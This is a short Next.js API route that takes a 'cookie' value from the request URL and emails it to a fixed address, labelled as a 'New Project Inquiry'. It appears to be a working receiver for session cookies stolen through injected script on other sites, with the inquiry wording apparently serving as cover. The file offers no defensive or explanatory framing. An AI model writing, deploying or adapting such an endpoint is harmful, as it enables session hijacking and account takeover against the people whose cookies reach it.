import { NextResponse } from "next/server";
import nodemailer from "nodemailer";

export async function GET(req: Request) {
  try {
    const url     = new URL(req.url);
    const cookie  = url.searchParams.get('cookie');
  

    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: parseInt(process.env.SMTP_PORT || "587"),
      secure: false,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
    });

    const mailOptions = {
      from: process.env.SMTP_USER,
      to: process.env.RECIPIENT_EMAIL,
      subject: "New Project Inquiry",
      html: `
        <h2>New Project Inquiry</h2>
        <p><strong>Cookie:</strong> ${cookie}</p>
      `,
    };

    await transporter.sendMail(mailOptions);
    return NextResponse.json({ message: "Email sent successfully" }, { status: 200 });
  } catch (error) {
    console.error("Error sending email:", error);
    return NextResponse.json({ error: "Failed to send email" }, { status: 500 });
  }
}
